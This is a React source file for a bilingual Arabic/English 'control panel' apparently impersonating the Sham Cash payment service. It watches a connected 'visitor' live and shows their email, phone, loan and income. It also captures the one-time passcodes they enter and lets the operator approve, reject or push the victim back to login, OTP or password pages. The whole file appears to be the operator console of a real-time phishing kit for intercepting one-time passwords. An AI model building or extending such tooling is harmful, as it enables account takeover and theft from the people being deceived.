import { useState, useEffect, useRef } from "react";
import {
  CheckCircle, XCircle, ArrowRightLeft, Clock, Bell,
  KeyRound, ShieldCheck, UserRound, X,
  Wifi, WifiOff, PenLine, Send, MapPin, Globe, Users
} from "lucide-react";

type Lang = "ar" | "en";
type OtpStatus = "pending" | "approved" | "rejected" | "redirected";
type PassStatus = "pending" | "approved" | "rejected";
type VisitorStatus = "connected" | "typing" | "submitted" | "disconnected";
type RedirectTarget = "login" | "otp" | "changepass";

interface OtpRequest { kind: "otp"; id: string; phone: string; code: string; time: string; status: OtpStatus; }
interface PassRequest { kind: "changepass"; id: string; time: string; status: PassStatus; }
type Request = OtpRequest | PassRequest;

interface Visitor {
  id: string;
  connectedAt: string;
  status: VisitorStatus;
  page: string;
  data: { email: string; phone: string; loan: string; income: string };
  lastSeen: number;
}

const translations = {
  ar: {
    title: "لوحة التحكم",
    subtitle: "إدارة طلبات المستخدمين",
    connectedUsers: "المتصلون",
    activeNow: "نشط الآن",
    langLabel: "العربية",
    langOther: "EN",
    currentVisitor: "الزائر الحالي",
    currentPage: "الصفحة الحالية",
    email: "البريد",
    phone: "الهاتف",
    loan: "قيمة القرض",
    income: "الدخل",
    newRequests: "طلبات جديدة",
    awaitingDecision: "في انتظار القرار",
    awaitingApproval: "في انتظار الموافقة",
    otpVerify: "التحقق بـ OTP",
    otpCode: "رمز OTP",
    approve: "موافقة",
    reject: "رفض",
    redirect: "تحويل",
    chooseRedirect: "اختر وجهة التحويل",
    changePass: "تغيير كلمة المرور",
    history: "السجل",
    noRequests: "لا توجد طلبات",
    noRequestsSub: "ستظهر الطلبات هنا عند إرسالها",
    approved: "موافق",
    rejected: "مرفوض",
    redirected: "محوّل",
    statusConnected: "متصل",
    statusTyping: "يكتب...",
    statusSubmitted: "أرسل طلب",
    statusDisconnected: "غير متصل",
    pages: { "تسجيل الدخول": "تسجيل الدخول", "التحقق OTP": "التحقق OTP", "تغيير كلمة المرور": "تغيير كلمة المرور" },
    redirectLogin: "تسجيل المعلومات",
    redirectLoginSub: "صفحة تسجيل الدخول",
    redirectOtp: "رمز الأمان",
    redirectOtpSub: "صفحة التحقق بـ OTP",
    redirectChangepass: "الكود",
    redirectChangepassSub: "صفحة تغيير كلمة المرور",
    otpHistory: "تحقق OTP",
    changePassHistory: "تغيير كلمة مرور",
  },
  en: {
    title: "Control Panel",
    subtitle: "Manage user requests",
    connectedUsers: "Online Users",
    activeNow: "Active now",
    langLabel: "English",
    langOther: "AR",
    currentVisitor: "Current Visitor",
    currentPage: "Current Page",
    email: "Email",
    phone: "Phone",
    loan: "Loan Amount",
    income: "Income",
    newRequests: "New Requests",
    awaitingDecision: "Awaiting decision",
    awaitingApproval: "Awaiting approval",
    otpVerify: "OTP Verification",
    otpCode: "OTP Code",
    approve: "Approve",
    reject: "Reject",
    redirect: "Redirect",
    chooseRedirect: "Choose redirect target",
    changePass: "Change Password",
    history: "History",
    noRequests: "No requests",
    noRequestsSub: "Requests will appear here when sent",
    approved: "Approved",
    rejected: "Rejected",
    redirected: "Redirected",
    statusConnected: "Connected",
    statusTyping: "Typing...",
    statusSubmitted: "Submitted",
    statusDisconnected: "Offline",
    pages: { "تسجيل الدخول": "Login", "التحقق OTP": "OTP Verify", "تغيير كلمة المرور": "Change Password" },
    redirectLogin: "Login Info",
    redirectLoginSub: "Login page",
    redirectOtp: "OTP Code",
    redirectOtpSub: "OTP verification page",
    redirectChangepass: "Security Code",
    redirectChangepassSub: "Change password page",
    otpHistory: "OTP Verify",
    changePassHistory: "Change Password",
  },
};

function playConnectSound() {
  try {
    const ctx = new AudioContext();
    [659, 880, 1047].forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination);
      osc.type = "sine";
      osc.frequency.setValueAtTime(freq, ctx.currentTime + i * 0.12);
      gain.gain.setValueAtTime(0, ctx.currentTime + i * 0.12);
      gain.gain.linearRampToValueAtTime(0.25, ctx.currentTime + i * 0.12 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.12 + 0.3);
      osc.start(ctx.currentTime + i * 0.12);
      osc.stop(ctx.currentTime + i * 0.12 + 0.35);
    });
  } catch {}
}

function playDisconnectSound() {
  try {
    const ctx = new AudioContext();
    [440, 330, 220].forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination);
      osc.type = "sine";
      osc.frequency.setValueAtTime(freq, ctx.currentTime + i * 0.14);
      gain.gain.setValueAtTime(0, ctx.currentTime + i * 0.14);
      gain.gain.linearRampToValueAtTime(0.2, ctx.currentTime + i * 0.14 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + i * 0.14 + 0.35);
      osc.start(ctx.currentTime + i * 0.14);
      osc.stop(ctx.currentTime + i * 0.14 + 0.4);
    });
  } catch {}
}

const pageIcons: Record<string, string> = {
  "تسجيل الدخول": "🔑",
  "التحقق OTP": "🛡️",
  "تغيير كلمة المرور": "🔒",
};

export function ShamCashAdmin({ onLogout }: { onLogout?: () => void }) {
  const [lang, setLang] = useState<Lang>("ar");
  const [requests, setRequests] = useState<Request[]>([]);
  const [hasNew, setHasNew] = useState(false);
  const [redirectPickerId, setRedirectPickerId] = useState<string | null>(null);
  const [visitor, setVisitor] = useState<Visitor | null>(null);
  const knownVisitorId = useRef<string | null>(null);
  const prevStatus = useRef<VisitorStatus | null>(null);

  const T = translations[lang];
  const isRtl = lang === "ar";
  const connectedCount = visitor && visitor.status !== "disconnected" ? 1 : 0;

  const redirectOptions = [
    { value: "login" as RedirectTarget, label: T.redirectLogin, sub: T.redirectLoginSub, icon: <UserRound className="h-4 w-4" />, color: "text-[#c9ccdb]", border: "border-white/10" },
    { value: "otp" as RedirectTarget, label: T.redirectOtp, sub: T.redirectOtpSub, icon: <ShieldCheck className="h-4 w-4" />, color: "text-[#657bd8]", border: "border-[#657bd8]/30" },
    { value: "changepass" as RedirectTarget, label: T.redirectChangepass, sub: T.redirectChangepassSub, icon: <KeyRound className="h-4 w-4" />, color: "text-[#1fc28a]", border: "border-[#1fc28a]/30" },
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      const otpStatus = localStorage.getItem("sham_otp_status");
      const phone = localStorage.getItem("sham_otp_phone") ?? "•••••••XXXX";
      const code = localStorage.getItem("sham_otp_code") ?? "------";
      if (otpStatus === "pending") {
        setRequests((prev) => {
          const exists = prev.some((r) => r.kind === "otp" && (r as OtpRequest).code === code && r.status === "pending");
          if (exists) return prev;
          setHasNew(true);
          return [{ kind: "otp", id: `otp-${Date.now()}`, phone, code, time: new Date().toLocaleTimeString("ar-SY"), status: "pending" }, ...prev];
        });
      }
      const passStatus = localStorage.getItem("sham_changepass_status");
      const passTime = localStorage.getItem("sham_changepass_time") ?? new Date().toLocaleTimeString("ar-SY");
      if (passStatus === "pending") {
        setRequests((prev) => {
          const exists = prev.some((r) => r.kind === "changepass" && r.status === "pending");
          if (exists) return prev;
          setHasNew(true);
          return [{ kind: "changepass", id: `pass-${Date.now()}`, time: passTime, status: "pending" }, ...prev];
        });
      }
      const vId = localStorage.getItem("sham_visitor_id");
      const vStatus = localStorage.getItem("sham_visitor_status") as VisitorStatus | null;
      const vConnectedAt = localStorage.getItem("sham_visitor_connected_at") ?? "";
      const vPage = localStorage.getItem("sham_visitor_page") ?? "";
      const vDataRaw = localStorage.getItem("sham_visitor_data");
      const vLastSeen = parseInt(localStorage.getItem("sham_visitor_heartbeat") ?? "0");
      const vData = vDataRaw ? JSON.parse(vDataRaw) : { email: "", phone: "", loan: "", income: "" };
      const isAlive = vStatus && vStatus !== "disconnected" && (Date.now() - vLastSeen < 4000);

      if (vId && isAlive) {
        if (vId !== knownVisitorId.current) {
          knownVisitorId.current = vId;
          playConnectSound();
          setHasNew(true);
        }
        const newStatus = vStatus ?? "connected";
        prevStatus.current = newStatus;
        setVisitor({ id: vId, connectedAt: vConnectedAt, status: newStatus, page: vPage, data: vData, lastSeen: vLastSeen });
      } else if (visitor && !isAlive) {
        if (prevStatus.current && prevStatus.current !== "disconnected") {
          playDisconnectSound();
        }
        prevStatus.current = "disconnected";
        setVisitor((prev) => prev ? { ...prev, status: "disconnected" } : null);
      }
    }, 600);
    return () => clearInterval(interval);
  }, [visitor]);

  function decideOtp(id: string, decision: OtpStatus) {
    setRequests((prev) => prev.map((r) => (r.id === id ? { ...r, status: decision } : r)));
    localStorage.setItem("sham_otp_status", decision);
    setHasNew(false);
  }
  function redirectOtp(id: string, target: RedirectTarget) {
    setRequests((prev) => prev.map((r) => (r.id === id ? { ...r, status: "redirected" } : r)));
    localStorage.setItem("sham_otp_redirect_target", target);
    localStorage.setItem("sham_otp_status", "redirected");
    setRedirectPickerId(null);
    setHasNew(false);
  }
  function decidePass(id: string, decision: PassStatus) {
    setRequests((prev) => prev.map((r) => (r.id === id ? { ...r, status: decision } : r)));
    localStorage.setItem("sham_changepass_status", decision);
    setHasNew(false);
  }

  const pending = requests.filter((r) => r.status === "pending");
  const history = requests.filter((r) => r.status !== "pending");

  const otpStatusLabel: Record<string, { label: string; color: string; bg: string }> = {
    approved: { label: T.approved, color: "text-[#1fc28a]", bg: "bg-[#1fc28a]/10" },
    rejected: { label: T.rejected, color: "text-[#e54343]", bg: "bg-[#e54343]/10" },
    redirected: { label: T.redirected, color: "text-[#657bd8]", bg: "bg-[#657bd8]/10" },
  };
  const passStatusLabel: Record<string, { label: string; color: string; bg: string }> = {
    approved: { label: T.approved, color: "text-[#1fc28a]", bg: "bg-[#1fc28a]/10" },
    rejected: { label: T.rejected, color: "text-[#e54343]", bg: "bg-[#e54343]/10" },
  };

  const visitorStatusConfig: Record<VisitorStatus, { label: string; color: string; dot: string; icon: React.ReactNode }> = {
    connected: { label: T.statusConnected, color: "text-[#1fc28a]", dot: "bg-[#1fc28a]", icon: <Wifi className="h-3 w-3" /> },
    typing: { label: T.statusTyping, color: "text-[#f5a623]", dot: "bg-[#f5a623]", icon: <PenLine className="h-3 w-3" /> },
    submitted: { label: T.statusSubmitted, color: "text-[#657bd8]", dot: "bg-[#657bd8]", icon: <Send className="h-3 w-3" /> },
    disconnected: { label: T.statusDisconnected, color: "text-white/40", dot: "bg-white/20", icon: <WifiOff className="h-3 w-3" /> },
  };

  return (
    <div className="min-h-screen w-full bg-[#0f1526] text-white font-['Inter']" dir={isRtl ? "rtl" : "ltr"}>
      <div className="mx-auto max-w-[420px] flex flex-col min-h-screen">

        <div className="sticky top-0 z-10 bg-[#0f1526]/95 backdrop-blur-sm px-4 pt-4 pb-3 border-b border-white/[0.05]">
          <div className="flex items-center justify-between">
            <h1 className="text-[17px] font-extrabold text-white/90">{T.title}</h1>
            <div className="relative">
              <Bell className="h-5 w-5 text-white/60" />
              {hasNew && <span className="absolute -top-1 -right-1 h-2.5 w-2.5 rounded-full bg-[#e54343] ring-2 ring-[#0f1526]" />}
            </div>
          </div>
          <p className="mt-0.5 text-[11px] text-[#c9ccdb]/45">{T.subtitle}</p>

          <div className="mt-3 grid grid-cols-2 gap-2">
            <div className="flex items-center gap-2.5 rounded-[12px] bg-[#1e2640] border border-[#657bd8]/25 px-3 py-2.5">
              <div className="flex h-8 w-8 items-center justify-center rounded-[8px] bg-[#657bd8]/15 shrink-0">
                <Users className="h-4 w-4 text-[#657bd8]" />
              </div>
              <div>
                <p className="text-[18px] font-extrabold text-white leading-none">{connectedCount}</p>
                <p className="text-[10px] text-[#c9ccdb]/50 mt-0.5">{T.connectedUsers}</p>
              </div>
              {connectedCount > 0 && (
                <span className="mr-auto flex items-center gap-1 text-[9px] font-bold text-[#1fc28a] bg-[#1fc28a]/10 rounded-full px-1.5 py-0.5">
                  <span className="h-1.5 w-1.5 rounded-full bg-[#1fc28a] animate-pulse" />
                  {T.activeNow}
                </span>
              )}
            </div>

            <button
              onClick={() => setLang(lang === "ar" ? "en" : "ar")}
              className="flex items-center gap-2.5 rounded-[12px] bg-[#1e2640] border border-white/[0.08] px-3 py-2.5 hover:bg-[#252f52] transition-colors active:scale-[0.97]"
            >
              <div className="flex h-8 w-8 items-center justify-center rounded-[8px] bg-white/5 shrink-0">
                <Globe className="h-4 w-4 text-white/60" />
              </div>
              <div className="text-right" dir="rtl">
                <p className="text-[13px] font-extrabold text-white leading-none">{T.langOther}</p>
                <p className="text-[10px] text-[#c9ccdb]/50 mt-0.5">{T.langLabel}</p>
              </div>
            </button>
          </div>
        </div>

        <div className="flex-1 px-4 py-4 space-y-4 overflow-y-auto">

          {visitor && (
            <div className="space-y-1.5">
              <p className="text-[10px] font-bold text-[#c9ccdb]/45 uppercase tracking-widest">{T.currentVisitor}</p>
              <div className={`rounded-[14px] border p-3 space-y-2.5 transition-all duration-300
                ${visitor.status === "disconnected"
                  ? "bg-[#1a2035] border-white/[0.05]"
                  : visitor.status === "typing"
                  ? "bg-[#1e2a1a] border-[#f5a623]/25 shadow-[0_0_16px_rgba(245,166,35,0.08)]"
                  : "bg-[#1a2a1e] border-[#1fc28a]/25 shadow-[0_0_16px_rgba(31,194,138,0.08)]"
                }`}>
                <div className="flex items-center justify-between gap-2">
                  <div className="flex items-center gap-1.5">
                    <span className={`h-2 w-2 rounded-full ${visitorStatusConfig[visitor.status].dot} ${visitor.status !== "disconnected" ? "animate-pulse" : ""}`} />
                    <span className={`text-[11px] font-bold ${visitorStatusConfig[visitor.status].color} flex items-center gap-1`}>
                      {visitorStatusConfig[visitor.status].icon}
                      {visitorStatusConfig[visitor.status].label}
                    </span>
                  </div>
                  <span className="text-[10px] text-[#c9ccdb]/40 flex items-center gap-1">
                    <Clock className="h-2.5 w-2.5" />{visitor.connectedAt}
                  </span>
                </div>

                {visitor.page && (
                  <div className="flex items-center gap-1.5 rounded-[8px] bg-[#657bd8]/10 border border-[#657bd8]/20 px-2.5 py-1.5">
                    <MapPin className="h-3 w-3 text-[#657bd8] shrink-0" />
                    <span className="text-[10px] text-[#c9ccdb]/60">{T.currentPage}:</span>
                    <span className="text-[11px] font-bold text-[#657bd8]">
                      {pageIcons[visitor.page] ?? "📄"} {T.pages[visitor.page as keyof typeof T.pages] ?? visitor.page}
                    </span>
                  </div>
                )}

                <div className="space-y-1.5 pt-0.5 border-t border-white/[0.06]">
                  {[
                    { label: T.email, value: visitor.data.email, icon: <UserRound className="h-3 w-3" /> },
                    { label: T.phone, value: visitor.data.phone, icon: <span className="text-[10px]">📞</span> },
                    { label: T.loan, value: visitor.data.loan ? `${visitor.data.loan} ل.س` : "", icon: <span className="text-[10px]">💵</span> },
                    { label: T.income, value: visitor.data.income ? `${visitor.data.income} ل.س` : "", icon: <span className="text-[10px]">📈</span> },
                  ].map((row) => (
                    <div key={row.label} className="flex items-center justify-between gap-2">
                      <span className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1">{row.icon}{row.label}</span>
                      <span className={`text-[11px] font-bold ${row.value ? "text-white/85" : "text-white/20"}`} dir="ltr">
                        {row.value || "—"}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {pending.length > 0 && (
            <div className="space-y-2.5">
              <p className="text-[10px] font-bold text-[#c9ccdb]/45 uppercase tracking-widest">{T.newRequests}</p>
              {pending.map((req) => {
                if (req.kind === "otp") {
                  const r = req as OtpRequest;
                  const showPicker = redirectPickerId === r.id;
                  const vd = visitor?.data;
                  return (
                    <div key={r.id} className="rounded-[14px] bg-[#1e2640] border border-[#657bd8]/30 p-3 space-y-2.5 shadow-[0_6px_18px_rgba(101,123,216,0.1)]">
                      <div className="flex items-start justify-between gap-2">
                        <div className="space-y-0.5">
                          <div className="flex items-center gap-1.5">
                            <ShieldCheck className="h-3.5 w-3.5 text-[#657bd8]" />
                            <span className="text-[11px] font-bold text-[#657bd8]">{T.otpVerify}</span>
                          </div>
                          <div className="flex items-center gap-1">
                            <span className="h-1.5 w-1.5 rounded-full bg-[#f5a623] animate-pulse" />
                            <span className="text-[10px] font-bold text-[#f5a623]">{T.awaitingDecision}</span>
                          </div>
                          <p className="text-[12px] font-extrabold text-white" dir="ltr">{r.phone}</p>
                          <p className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1"><Clock className="h-2.5 w-2.5" />{r.time}</p>
                        </div>
                        <div className="rounded-[8px] bg-[#2a3557] px-2.5 py-1.5 text-center shrink-0">
                          <p className="text-[9px] text-[#c9ccdb]/50 mb-0.5">{T.otpCode}</p>
                          <p className="text-[16px] font-extrabold text-white tracking-[0.1em]" dir="ltr">{r.code || "------"}</p>
                        </div>
                      </div>

                      <div className="rounded-[10px] bg-[#2a3557]/70 border border-white/[0.06] p-2.5 space-y-1.5">
                        {[
                          { label: T.email, value: vd?.email, icon: "✉️" },
                          { label: T.phone, value: vd?.phone, icon: "📞" },
                          { label: T.loan, value: vd?.loan ? `${vd.loan} ل.س` : "", icon: "💵" },
                          { label: T.income, value: vd?.income ? `${vd.income} ل.س` : "", icon: "📈" },
                        ].map((row) => (
                          <div key={row.label} className="flex items-center justify-between gap-2 py-0.5 border-b border-white/[0.04] last:border-0">
                            <span className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1">
                              <span className="text-[10px]">{row.icon}</span>{row.label}
                            </span>
                            <span className={`text-[11px] font-bold ${row.value ? "text-white/90" : "text-white/20"}`} dir="ltr">
                              {row.value || "—"}
                            </span>
                          </div>
                        ))}
                      </div>

                      {!showPicker ? (
                        <div className="grid grid-cols-3 gap-1.5">
                          <button onClick={() => decideOtp(r.id, "approved")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
                            <CheckCircle className="h-4 w-4" /><span className="text-[10px] font-bold">{T.approve}</span>
                          </button>
                          <button onClick={() => decideOtp(r.id, "rejected")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
                            <XCircle className="h-4 w-4" /><span className="text-[10px] font-bold">{T.reject}</span>
                          </button>
                          <button onClick={() => setRedirectPickerId(r.id)} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#657bd8]/15 border border-[#657bd8]/30 py-2.5 text-[#657bd8] hover:bg-[#657bd8]/25 transition-colors active:scale-95">
                            <ArrowRightLeft className="h-4 w-4" /><span className="text-[10px] font-bold">{T.redirect}</span>
                          </button>
                        </div>
                      ) : (
                        <div className="space-y-1.5">
                          <div className="flex items-center justify-between mb-0.5">
                            <p className="text-[11px] font-bold text-[#657bd8]">{T.chooseRedirect}</p>
                            <button onClick={() => setRedirectPickerId(null)} className="text-white/40 hover:text-white/70"><X className="h-3.5 w-3.5" /></button>
                          </div>
                          {redirectOptions.map((opt) => (
                            <button key={opt.value} onClick={() => redirectOtp(r.id, opt.value)}
                              className={`w-full flex items-center gap-2.5 rounded-[10px] bg-[#2a3557] border ${opt.border} px-3 py-2.5 hover:bg-[#313f6a] transition-colors active:scale-[0.98]`}>
                              <span className={opt.color}>{opt.icon}</span>
                              <div className={isRtl ? "text-right" : "text-left"}>
                                <p className={`text-[12px] font-bold ${opt.color}`}>{opt.label}</p>
                                <p className="text-[10px] text-white/35">{opt.sub}</p>
                              </div>
                              <ArrowRightLeft className="h-3.5 w-3.5 text-white/20 mr-auto ml-auto" />
                            </button>
                          ))}
                        </div>
                      )}
                    </div>
                  );
                }
                const r = req as PassRequest;
                return (
                  <div key={r.id} className="rounded-[14px] bg-[#1e2640] border border-[#1fc28a]/20 p-3 space-y-3 shadow-[0_6px_18px_rgba(31,194,138,0.08)]">
                    <div className="space-y-0.5">
                      <div className="flex items-center gap-1.5"><KeyRound className="h-3.5 w-3.5 text-[#1fc28a]" /><span className="text-[11px] font-bold text-[#1fc28a]">{T.changePass}</span></div>
                      <div className="flex items-center gap-1"><span className="h-1.5 w-1.5 rounded-full bg-[#f5a623] animate-pulse" /><span className="text-[10px] font-bold text-[#f5a623]">{T.awaitingApproval}</span></div>
                      <p className="text-[10px] text-[#c9ccdb]/45 flex items-center gap-1"><Clock className="h-2.5 w-2.5" />{r.time}</p>
                    </div>
                    <div className="grid grid-cols-2 gap-1.5">
                      <button onClick={() => decidePass(r.id, "approved")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#1fc28a]/15 border border-[#1fc28a]/30 py-2.5 text-[#1fc28a] hover:bg-[#1fc28a]/25 transition-colors active:scale-95">
                        <CheckCircle className="h-4 w-4" /><span className="text-[10px] font-bold">{T.approve}</span>
                      </button>
                      <button onClick={() => decidePass(r.id, "rejected")} className="flex flex-col items-center gap-1 rounded-[10px] bg-[#e54343]/15 border border-[#e54343]/30 py-2.5 text-[#e54343] hover:bg-[#e54343]/25 transition-colors active:scale-95">
                        <XCircle className="h-4 w-4" /><span className="text-[10px] font-bold">{T.reject}</span>
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}

          {!visitor && pending.length === 0 && history.length === 0 && (
            <div className="flex flex-col items-center justify-center py-16 space-y-3 text-center">
              <div className="h-14 w-14 rounded-full bg-[#1e2640] flex items-center justify-center">
                <Bell className="h-6 w-6 text-white/20" />
              </div>
              <p className="text-[13px] font-bold text-white/30">{T.noRequests}</p>
              <p className="text-[11px] text-white/20">{T.noRequestsSub}</p>
            </div>
          )}

          {history.length > 0 && (
            <div className="space-y-2">
              <p className="text-[10px] font-bold text-[#c9ccdb]/45 uppercase tracking-widest">{T.history}</p>
              {history.map((req) => {
                const labelMap = req.kind === "otp" ? otpStatusLabel : passStatusLabel;
                const s = labelMap[req.status];
                return (
                  <div key={req.id} className="rounded-[12px] bg-[#1a2035] border border-white/[0.04] p-3 flex items-center justify-between gap-2">
                    <div className="space-y-0.5">
                      <div className="flex items-center gap-1">
                        {req.kind === "otp" ? <ShieldCheck className="h-3 w-3 text-[#657bd8]" /> : <KeyRound className="h-3 w-3 text-[#1fc28a]" />}
                        <p className="text-[11px] font-bold text-white/70">{req.kind === "otp" ? T.otpHistory : T.changePassHistory}</p>
                      </div>
                      {req.kind === "otp" && <p className="text-[10px] text-white/35" dir="ltr">{(req as OtpRequest).phone}</p>}
                      <p className="text-[10px] text-[#c9ccdb]/35 flex items-center gap-1"><Clock className="h-2.5 w-2.5" />{req.time}</p>
                    </div>
                    {s && <span className={`rounded-[6px] px-2.5 py-1 text-[10px] font-bold ${s.color} ${s.bg}`}>{s.label}</span>}
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default ShamCashAdmin;
